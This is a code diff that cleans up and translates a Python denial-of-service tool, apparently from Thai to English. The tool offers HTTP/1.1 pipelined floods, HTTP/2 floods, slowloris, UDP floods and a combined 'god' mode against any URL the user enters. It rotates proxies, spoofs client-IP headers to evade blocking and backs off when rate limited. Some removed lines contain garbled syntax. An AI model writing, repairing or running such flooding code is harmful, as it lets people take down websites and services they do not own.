@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-     ███████╗███╗   ██╗ ██████╗██╗  ██╗
+ █"""
+    ██████╗███╗   ██╗ ██████╗██╗  ██╗
      ██╔════╝████╗  ██║██╔════╝██║ ██╔╝
      ███████╗██╔██╗ ██║██║     █████╔╝
      ╚════██║██║╚██╗██║██║     ██╔═██╗
@@ -16,7 +16,6 @@ import os
 import sys
 import ssl
 import time
-import json
 import random
 import socket
 import string
@@ -74,16 +73,24 @@ PATHS = ["/", "/index.html", "/home", "/api", "/search", "/login", "/feed",
 
 _ALNUM = string.ascii_letters + string.digits
 
+
 def rnd(n=10):
     return ''.join(random.choices(_ALNUM, k=n))
 
+
 def rnd_ip():
-    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+    return "{}.{}.{}.{}".format(
+        random.randint(1, 255),
+        random.randint(0, 255),
+        random.randint(0, 255),
+        random.randint(1, 254),
+    )
+
 
 def rnd_path():
     p = random.choice(PATHS)
     if random.random() < 0.5:
-        p += f"?{rnd(6)}={rnd(8)}"
+        p += "?{}={}".format(rnd(6), rnd(8))
     return p
 
 
@@ -92,7 +99,7 @@ def clear():
 
 
 # ==========================================================
-# PROXY POOL (http + socks5)
+# PROXY POOL
 # ==========================================================
 
 class ProxyPool:
@@ -168,10 +175,14 @@ class Stats:
     def hit(self, ok=True, blocked=False, conn=0):
         with self.lock:
             self.sent += 1
-            if ok: self.ok += 1
-            else:   self.err += 1
-            if blocked: self.blocked += 1
-            if conn: self.conn += conn
+            if ok:
+                self.ok += 1
+            else:
+                self.err += 1
+            if blocked:
+                self.blocked += 1
+            if conn:
+                self.conn += conn
 
     def rate(self):
         return self.sent / max(time.time() - self.start, 0.001)
@@ -198,12 +209,14 @@ def reporter(stop_flag):
         inst = (now - last) / max(dt, 0.001)
         stats.history.append(inst)
         last, last_t = now, time.time()
-        bar = "█" * min(40, int(inst / 200))
+        bar = "#" * min(40, int(inst / 200))
         try:
             print(
-                f"\r[+] ส่ง={stats.sent:>11}  ok={stats.ok:>11}  "
-                f"พลาด={stats.err:>8}  บล็อค={stats.blocked:>6}  "
-                f"conn={stats.conn:>6}  {inst:>7.0f}/s  {bar:<40}",
+                "\r[+] sent={:>11}  ok={:>11}  err={:>8}  "
+                "block={:>6}  conn={:>6}  {:>7.0f}/s  {:<40}".format(
+                    stats.sent, stats.ok, stats.err,
+                    stats.blocked, stats.conn, inst, bar,
+                ),
                 end="", flush=True,
             )
         except Exception:
@@ -222,15 +235,16 @@ def parse_target(url):
     host = p.hostname
     port = p.port or (443 if scheme == "https" else 80)
     path = p.path or "/"
-    return scheme, host, port, path, f"{scheme}://{host}:{port}{path}"
+    return scheme, host, port, path, "{}://{}:{}{}".format(scheme, host, port, path)
 
 
 # ==========================================================
-# TLS CONTEXT (shared, cached)
+# TLS CONTEXT (cached)
 # ==========================================================
 
 _TLS_CTX = None
 _TLS_LOCK = threading.Lock()
+
 
 def get_tls_ctx():
     global _TLS_CTX
@@ -249,14 +263,16 @@ def get_tls_ctx():
 
 
 # ==========================================================
-# RAW — pipelined socket core (main workhorse)
+# RAW — pipelined socket core
 # ==========================================================
 
 class RawFlooder(threading.Thread):
     def __init__(self, scheme, host, port, base_path, host_hdr, stop_flag,
                  pipeline=40, dynamic=True):
         super().__init__(daemon=True)
-        self.scheme, self.host, self.port = scheme, host, port
+        self.scheme = scheme
+        self.host = host
+        self.port = port
         self.base_path = base_path
         self.host_hdr = host_hdr
         self.stop_flag = stop_flag
@@ -269,29 +285,33 @@ class RawFlooder(threading.Thread):
         px = parse_proxy(proxies.get())
 
         if px and HAVE_SOCKS and px["scheme"].startswith("socks"):
-            s = socks.socksocket()
-            s.set_proxy(
-                socks.SOCKS5 if "5" in px["scheme"] else socks.SOCKS4,
-                px["host"], px["port"],
-                username=px["user"], password=px["pass"],
-            )
-            s.settimeout(6)
-            s.connect((self.host, self.port))
-            if self.tls:
-                s = get_tls_ctx().wrap_socket(s, server_hostname=self.host)
-            self.px = px
-            return s
+            try:
+                s = socks.socksocket()
+                proto = socks.SOCKS5 if "5" in px["scheme"] else socks.SOCKS4
+                s.set_proxy(proto, px["host"], px["port"],
+                            username=px["user"], password=px["pass"])
+                s.settimeout(6)
+                s.connect((self.host, self.port))
+                if self.tls:
+                    s = get_tls_ctx().wrap_socket(s, server_hostname=self.host)
+                self.px = px
+                return s
+            except Exception:
+                proxies.mark_bad(proxies.get())
 
         if px and px["scheme"].startswith("http"):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(6)
                 s.connect((px["host"], px["port"]))
-                connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
+                connect = "CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n".format(
+                    self.host, self.port, self.host, self.port)
                 if px["user"]:
                     import base64
-                    cred = base64.b64encode(f"{px['user']}:{px['pass']}".encode()).decode()
-                    connect += f"Proxy-Authorization: Basic {cred}\r\n"
+                    cred = base64.b64encode(
+                        "{}:{}".format(px["user"], px["pass"]).encode()
+                    ).decode()
+                    connect += "Proxy-Authorization: Basic {}\r\n".format(cred)
                 connect += "\r\n"
                 s.sendall(connect.encode())
                 resp = s.recv(1024)
@@ -314,33 +334,37 @@ class RawFlooder(threading.Thread):
 
     def _req(self):
         fwd = rnd_ip()
-        qs = f"{rnd(10)}={rnd(14)}&{rnd(10)}={rnd(14)}&_={int(time.time()*1000)}{rnd(4)}"
-        return (
-            f"GET {self.base_path}?{qs} HTTP/1.1\r\n"
-            f"Host: {self.host_hdr}\r\n"
-            f"User-Agent: {random.choice(UA)}\r\n"
-            f"Referer: {random.choice(REF)}\r\n"
-            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
-            f"Accept-Language: en-US,en;q=0.9,th;q=0.8\r\n"
-            f"Accept-Encoding: gzip, deflate, br, zstd\r\n"
-            f"Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n"
-            f"Pragma: no-cache\r\n"
-            f"Expires: 0\r\n"
-            f"X-Forwarded-For: {fwd}\r\n"
-            f"X-Real-IP: {fwd}\r\n"
-            f"X-Originating-IP: {fwd}\r\n"
-            f"X-Remote-IP: {rnd_ip()}\r\n"
-            f"X-Remote-Addr: {rnd_ip()}\r\n"
-            f"X-Client-IP: {rnd_ip()}\r\n"
-            f"CF-Connecting-IP: {fwd}\r\n"
-            f"True-Client-IP: {fwd}\r\n"
-            f"X-Original-URL: /{rnd(8)}\r\n"
-            f"X-Rewrite-URL: /{rnd(8)}\r\n"
-            f"X-Forwarded-Host: {rnd(6)}.{rnd(4)}.com\r\n"
-            f"X-Forwarded-Proto: https\r\n"
-            f"Forwarded: for={fwd};proto=https\r\n"
-            f"Connection: keep-alive\r\n\r\n"
-        ).encode()
+        qs = "{}={}&{}={}&_={}{}".format(
+            rnd(10), rnd(14), rnd(10), rnd(14),
+            int(time.time() * 1000), rnd(4),
+        )
+        lines = [
+            "GET {}?{} HTTP/1.1".format(self.base_path, qs),
+            "Host: {}".format(self.host_hdr),
+            "User-Agent: {}".format(random.choice(UA)),
+            "Referer: {}".format(random.choice(REF)),
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.9,th;q=0.8",
+            "Accept-Encoding: gzip, deflate, br",
+            "Cache-Control: no-cache, no-store, must-revalidate, max-age=0",
+            "Pragma: no-cache",
+            "Expires: 0",
+            "X-Forwarded-For: {}".format(fwd),
+            "X-Real-IP: {}".format(fwd),
+            "X-Originating-IP: {}".format(fwd),
+            "X-Remote-IP: {}".format(rnd_ip()),
+            "X-Remote-Addr: {}".format(rnd_ip()),
+            "X-Client-IP: {}".format(rnd_ip()),
+            "CF-Connecting-IP: {}".format(fwd),
+            "True-Client-IP: {}".format(fwd),
+            "X-Original-URL: /{}".format(rnd(8)),
+            "X-Rewrite-URL: /{}".format(rnd(8)),
+            "X-Forwarded-Host: {}.{}.com".format(rnd(6), rnd(4)),
+            "X-Forwarded-Proto: https",
+            "Forwarded: for={};proto=https".format(fwd),
+            "Connection: keep-alive",
+        ]
+        return ("\r\n".join(lines) + "\r\n\r\n").encode()
 
     def run(self):
         sock = None
@@ -351,13 +375,14 @@ class RawFlooder(threading.Thread):
             stats.hit(False)
             return
 
-        # warm-up burst
         try:
             sock.sendall(self._req() * (self.pipeline * 2))
         except Exception:
             stats.hit(False)
-            try: sock.close()
-            except Exception: pass
+            try:
+                sock.close()
+            except Exception:
+                pass
             return
 
         cur_pipeline = self.pipeline
@@ -366,12 +391,10 @@ class RawFlooder(threading.Thread):
         while not self.stop_flag.is_set():
             try:
                 sock.sendall(self._req() * cur_pipeline)
-                # drain some to avoid buffer full
                 try:
                     data = sock.recv(32768)
                     if b"429" in data or b"503" in data:
                         stats.hit(True, blocked=True)
-                        # detect block — shrink pipeline, rotate everything
                         if self.dynamic:
                             cur_pipeline = max(5, cur_pipeline // 2)
                     else:
@@ -381,13 +404,13 @@ class RawFlooder(threading.Thread):
                             cur_pipeline = min(self.pipeline, cur_pipeline + 2)
                 except socket.timeout:
                     stats.hit(True)
-                except Exception:
-                    raise
             except Exception:
                 stats.hit(False)
                 fail_streak += 1
-                try: sock.close()
-                except Exception: pass
+                try:
+                    sock.close()
+                except Exception:
+                    pass
                 if fail_streak > 5:
                     time.sleep(0.5)
                     fail_streak = 0
@@ -399,8 +422,10 @@ class RawFlooder(threading.Thread):
                     time.sleep(0.3)
                     continue
 
-        try: sock.close()
-        except Exception: pass
+        try:
+            sock.close()
+        except Exception:
+            pass
 
 
 # ==========================================================
@@ -410,7 +435,8 @@ class RawFlooder(threading.Thread):
 async def h2_worker(client, base_url, stop_flag):
     while not stop_flag.is_set():
         try:
-            url = f"{base_url}?{rnd(10)}={rnd(14)}&_={int(time.time()*1000)}"
+            url = "{}?{}={}&_={}".format(
+                base_url, rnd(10), rnd(14), int(time.time() * 1000))
             r = await client.get(url, headers={
                 "User-Agent": random.choice(UA),
                 "Referer": random.choice(REF),
@@ -421,14 +447,15 @@ async def h2_worker(client, base_url, stop_flag):
                 "X-Real-IP": rnd_ip(),
                 "CF-Connecting-IP": rnd_ip(),
             }, timeout=4.0)
-            blocked = r.status_code in (429, 503, 403, 503)
+            blocked = r.status_code in (403, 429, 503)
             stats.hit(r.status_code < 500, blocked=blocked)
         except Exception:
             stats.hit(False)
 
 
 async def h2_runner(base_url, streams, stop_flag):
-    limits = httpx.Limits(max_connections=streams, max_keepalive_connections=streams)
+    limits = httpx.Limits(max_connections=streams,
+                          max_keepalive_connections=streams)
     async with httpx.AsyncClient(
         http2=True, limits=limits, verify=False, follow_redirects=False,
         timeout=httpx.Timeout(4.0, connect=3.0),
@@ -439,12 +466,14 @@ async def h2_runner(base_url, streams, stop_flag):
 
 
 def h2_thread(base_url, streams, stop_flag):
-    try: asyncio.run(h2_runner(base_url, streams, stop_flag))
-    except Exception: pass
+    try:
+        asyncio.run(h2_runner(base_url, streams, stop_flag))
+    except Exception:
+        pass
 
 
 # ==========================================================
-# SLOWLORIS — connection table exhaustion
+# SLOWLORIS
 # ==========================================================
 
 def slow_worker(host, port, tls, stop_flag, per_thread=300):
@@ -456,36 +485,37 @@ def slow_worker(host, port, tls, stop_flag, per_thread=300):
             s = get_tls_ctx().wrap_socket(s, server_hostname=host)
         return s
 
-    socks_list = []
+    sock_list = []
     while not stop_flag.is_set():
-        while len(socks_list) < per_thread and not stop_flag.is_set():
+        while len(sock_list) < per_thread and not stop_flag.is_set():
             try:
                 s = _open()
-                s.send(f"GET /?{rnd(12)} HTTP/1.1\r\n".encode())
-                s.send(f"Host: {host}\r\n".encode())
-                s.send(f"User-Agent: {random.choice(UA)}\r\n".encode())
-                s.send(f"Accept: */*\r\n".encode())
-                s.send(f"X-Forwarded-For: {rnd_ip()}\r\n".encode())
-                socks_list.append(s)
+                s.send("GET /?{} HTTP/1.1\r\n".format(rnd(12)).encode())
+                s.send("Host: {}\r\n".format(host).encode())
+                s.send("User-Agent: {}\r\n".format(random.choice(UA)).encode())
+                s.send("Accept: */*\r\n".encode())
+                s.send("X-Forwarded-For: {}\r\n".format(rnd_ip()).encode())
+                sock_list.append(s)
                 stats.hit(True, conn=1)
             except Exception:
                 stats.hit(False)
                 break
 
         time.sleep(random.uniform(8, 15))
-        for s in list(socks_list):
+        for s in list(sock_list):
             try:
-                # drip random headers to keep alive
-                s.send(f"X-{rnd(8)}: {rnd(40)}\r\n".encode())
+                s.send("X-{}: {}\r\n".format(rnd(8), rnd(40)).encode())
             except Exception:
-                try: s.close()
-                except Exception: pass
-                socks_list.remove(s)
+                try:
+                    s.close()
+                except Exception:
+                    pass
+                sock_list.remove(s)
                 stats.hit(False)
 
 
 # ==========================================================
-# UDP — volumetric
+# UDP
 # ==========================================================
 
 def udp_worker(host, port, stop_flag, payload_size=1400, batch=100):
@@ -515,19 +545,21 @@ def run_attack(mode, url, threads, duration):
     stats = Stats()
 
     scheme, host, port, path, full = parse_target(url)
-    host_hdr = host if port in (80, 443) else f"{host}:{port}"
+    host_hdr = host if port in (80, 443) else "{}:{}".format(host, port)
     stop_flag = threading.Event()
 
     print("")
-    print("  ─────────────────────────────────────────────")
-    print(f"  เป้าหมาย    : {full}")
-    print(f"  โหมด        : {mode.upper()}")
-    print(f"  เธรด/สตรีม  : {threads}")
-    print(f"  เวลา        : {'ไม่หยุด' if duration == 0 else str(duration)+' วินาที'}")
-    print(f"  พร็อกซี่    : {proxies.count() if proxies.count() else 'ไม่มี (IP ตรง)'}")
-    print(f"  SOCKS5      : {'รองรับ' if HAVE_SOCKS else 'ไม่ติดตั้ง (pip install pysocks)'}")
-    print(f"  HTTP/2      : {'พร้อม' if HAVE_HX else 'ไม่ติดตั้ง (pip install httpx[http2])'}")
-    print("  ─────────────────────────────────────────────")
+    print("  ---------------------------------------------")
+    print("  target      : {}".format(full))
+    print("  mode        : {}".format(mode.upper()))
+    print("  threads     : {}".format(threads))
+    print("  duration    : {}".format(
+        "forever" if duration == 0 else "{}s".format(duration)))
+    print("  proxies     : {}".format(
+        proxies.count() if proxies.count() else "none (direct IP)"))
+    print("  socks5      : {}".format("ready" if HAVE_SOCKS else "off"))
+    print("  http2       : {}".format("ready" if HAVE_HX else "off"))
+    print("  ---------------------------------------------")
     print("")
 
     threading.Thread(target=reporter, args=(stop_flag,), daemon=True).start()
@@ -538,14 +570,14 @@ def run_attack(mode, url, threads, duration):
                 RawFlooder(scheme, host, port, path, host_hdr, stop_flag).start()
 
         elif mode == "h2":
-           ( if not HAVE_HX:
-                print("[!] ติดตั้ง: pip install httpx[http2]")
+            if not HAVE_HX:
+                print("[!] install: pip3 install httpx[http2]")
                 return
-            loops = max1, threads // 300)
+            loops = max(1, threads // 300)
+            per = threads // loops
             for _ in range(loops):
                 threading.Thread(
-                    target=h2_thread,
-                    args=(full, threads // loops, stop_flag),
+                    target=h2_thread, args=(full, per, stop_flag),
                     daemon=True,
                 ).start()
 
@@ -559,16 +591,19 @@ def run_attack(mode, url, threads, duration):
                 ).start()
 
         elif mode == "udp":
-            for _ in range(thread5s):
+            for _ in range(threads):
                 threading.Thread(
-                    target=:udp_worker, args=(host, port, {' stop_flag), daemon=True
-               ON ).start()
+                    target=udp_worker,
+                    args=(host, port, stop_flag),
+                    daemon=True,
+                ).start()
 
         elif mode == "mixed":
             half = threads // 2
             for _ in range(half):
                 RawFlooder(scheme, host, port, path, host_hdr, stop_flag).start()
-            for _ in range(max(1, half // 12)):
+            slow_n = max(1, half // 12)
+            for _ in range(slow_n):
                 threading.Thread(
                     target=slow_worker,
                     args=(host, port, scheme == "https", stop_flag),
@@ -576,14 +611,16 @@ def run_attack(mode, url, threads, duration):
                 ).start()
             if HAVE_HX:
                 threading.Thread(
-                    target=h2_thread, args=(full, 400, stop_flag), daemon=True
+                    target=h2_thread, args=(full, 400, stop_flag),
+                    daemon=True,
                 ).start()
 
         elif mode == "god":
             q = max(1, threads // 4)
             for _ in range(q):
                 RawFlooder(scheme, host, port, path, host_hdr, stop_flag).start()
-            for _ in range(max(1, q // 12)):
+            slow_n = max(1, q // 12)
+            for _ in range(slow_n):
                 threading.Thread(
                     target=slow_worker,
                     args=(host, port, scheme == "https", stop_flag),
@@ -591,11 +628,15 @@ def run_attack(mode, url, threads, duration):
                 ).start()
             if HAVE_HX:
                 threading.Thread(
-                    target=h2_thread, args=(full, q, stop_flag), daemon=True
+                    target=h2_thread, args=(full, q, stop_flag),
+                    daemon=True,
                 ).start()
-            for _ in range(max(1, q // 4)):
+            udp_n = max(1, q // 4)
+            for _ in range(udp_n):
                 threading.Thread(
-                    target=udp_worker, args=(host, port, stop_flag), daemon=True
+                    target=udp_worker,
+                    args=(host, port, stop_flag),
+                    daemon=True,
                 ).start()
 
         if duration > 0:
@@ -604,21 +645,22 @@ def run_attack(mode, url, threads, duration):
         else:
             while True:
                 time.sleep(1)
+
     except KeyboardInterrupt:
-        print("\n\n[!] Ctrl+C — กำลังหยุด")
+        print("\n\n[!] ctrl+c — stopping")
         stop_flag.set()
 
     time.sleep(0.8)
     elapsed = time.time() - stats.start
-    print(f"\n\n[=] สรุปผล")
-    print(f"    ส่งทั้งหมด : {stats.sent:,}")
-    print(f"    สำเร็จ     : {stats.ok:,}")
-    print(f"    พลาด       : {stats.err:,}")
-    print(f"    ถูกบล็อค   : {stats.blocked:,}")
-    print(f"    conn สูงสุด: {stats.conn:,}")
-    print(f"    เวลา       : {elapsed:.1f}s")
-    print(f"    เฉลี่ย     : {stats.sent/max(elapsed,0.1):,.0f} req/s")
-    print(f"    อัตราสำเร็จ: {stats.ratio():.1f}%")
+    print("\n\n[=] summary")
+    print("    sent       : {:,}".format(stats.sent))
+    print("    ok         : {:,}".format(stats.ok))
+    print("    err        : {:,}".format(stats.err))
+    print("    blocked    : {:,}".format(stats.blocked))
+    print("    conn       : {:,}".format(stats.conn))
+    print("    elapsed    : {:.1f}s".format(elapsed))
+    print("    avg rate   : {:,.0f} req/s".format(stats.sent / max(elapsed, 0.1)))
+    print("    success    : {:.1f}%".format(stats.ratio()))
     print("")
 
 
@@ -650,79 +692,89 @@ def ask(prompt, default=None, cast=str):
         try:
             return cast(v)
         except Exception:
-            print("  ค่าไม่ถูกต้อง ลองใหม่")
+            print("  invalid value, try again")
 
 
 def menu():
     clear()
     print(BANNER)
-    print(f"  proxy pool: {proxies.count()} ตัว    "
-          f"socks' if HAVE_SOCKS else 'OFF'}    "
-          f"http2: {'ON' if HAVE_HX else 'OFF'}\n")
-    print("  [1]  RAW   — HTTP/1.1 pipelined socket (เร็วสุด)")
-    print("  [2]  H2    — HTTP/2 multiplex (หลาย stream ต่อ conn)")
-    print("  [3]  SLOW  — slowloris (ยิงครึ่ง connection)")
+    print("  proxy pool: {}    socks5: {}    http2: {}\n".format(
+        proxies.count(),
+        "ON" if HAVE_SOCKS else "OFF",
+        "ON" if HAVE_HX else "OFF",
+    ))
+    print("  [1]  RAW   — http/1.1 pipelined socket (fastest)")
+    print("  [2]  H2    — http/2 multiplex")
+    print("  [3]  SLOW  — slowloris half-open connections")
     print("  [4]  UDP   — volumetric datagram")
     print("  [5]  MIX   — raw + slow + h2")
-    print("  [6]  GOD   — ทุกอย่างพร้อมกัน")
-    print("  [7]  โหลด proxy list")
-    print("  [8]  ทดสอบ localhost")
-    print("  [0]  ออก")
+    print("  [6]  GOD   — everything at once")
+    print("  [7]  load proxy list")
+    print("  [8]  test on localhost")
+    print("  [0]  exit")
     print("")
 
-    choice = ask("เลือก > ", cast=str)
+    choice = ask("select > ", cast=str)
 
     if choice == "0":
-        print("\nบายยย kanha\n")
+        print("\nbye kanha\n")
         sys.exit(0)
 
     if choice == "7":
-        path = input("path ไฟล์ proxy > ").strip()
+        path = input("proxy list path > ").strip()
         n = proxies.load(path)
-        print(f"[+] โหลดได้ {n} ตัว" if n else "[!] ไฟล์ว่างหรือไม่พบ")
+        if n:
+            print("[+] loaded {} proxies".format(n))
+        else:
+            print("[!] empty or missing file")
         time.sleep(1.2)
         return menu()
 
     if choice == "8":
-        print("\n[i] เปิดในอีก terminal ก่อน: python -m http.server 8000\n")
-        mode = "raw"
-        url = "http://127.0.0.1:8000"
-        threads = ask("จำนวนเธรด [300] > ", default=300, cast=int)
-        duration = ask("เวลา (วิ) [10] > ", default=10, cast=int)
-        run_attack(mode, url, threads, duration)
-        input("\nEnter กลับเมนู")
+        print("\n[i] run this in another terminal first: python3 -m http.server 8000\n")
+        threads = ask("threads [300] > ", default=300, cast=int)
+        duration = ask("duration secs [10] > ", default=10, cast=int)
+        run_attack("raw", "http://127.0.0.1:8000", threads, duration)
+        input("\nenter to return to menu")
         return
 
-    mode_map = {"1": "raw", "2": "h2", "3": "slow", "4": "udp",
-                "5": "mixed", "6": "god"}
+    mode_map = {
+        "1": "raw", "2": "h2", "3": "slow",
+        "4": "udp", "5": "mixed", "6": "god",
+    }
     if choice not in mode_map:
-        print("[!] ไม่ถูกต้อง")
+        print("[!] invalid choice")
         time.sleep(1)
         return menu()
 
     mode = mode_map[choice]
     print("")
-    url = input("วาง URL เป้าหมาย > ").strip()
+    url = input("target url > ").strip()
     if not url:
-        print("[!] ต้องใส่ URL")
+        print("[!] url required")
         time.sleep(1)
         return menu()
 
-    defaults = {"raw": 1500, "h2": 4000, "slow": 120, "udp": 200,
-                "mixed": 2500, "god": 3000}
+    defaults = {
+        "raw": 1500, "h2": 4000, "slow": 120,
+        "udp": 200, "mixed": 2500, "god": 3000,
+    }
     d = defaults[mode]
-    threads = ask(f"จำนวนเธรด [{d}] > ", default=d, cast=int)
-    duration = ask("เวลา (วิ, 0 = ไม่หยุด) [60] > ", default=60, cast=int)
+    threads = ask("threads [{}] > ".format(d), default=d, cast=int)
+    duration = ask("duration secs (0 = forever) [60] > ", default=60, cast=int)
 
     print("")
-    ok = input(f"ยิงใส่ {url}\nโหมด {mode} · {threads} เธรด · {duration}s — เริ่ม? (y/n) > ").strip().lower()
+    ok = input(
+        "attack {}  mode={}  threads={}  {}s  -- start? (y/n) > ".format(
+            url, mode, threads, duration)
+    ).strip().lower()
     if ok != "y":
-        print("[!] ยกเลิก")
+        print("[!] cancelled")
         time.sleep(0.8)
         return menu()
 
     run_attack(mode, url, threads, duration)
-    input("\nEnter กลับเมนู")
+    input("\nenter to return to menu")
 
 
 def main():
@@ -745,10 +797,10 @@ def main():
         try:
             menu()
         except KeyboardInterrupt:
-            print("\n[!] ออก")
+            print("\n[!] exit")
             sys.exit(0)
         except Exception as e:
-            print(f"[!] error: {e}")
+            print("[!] error: {}".format(e))
             time.sleep(1.2)
 
 
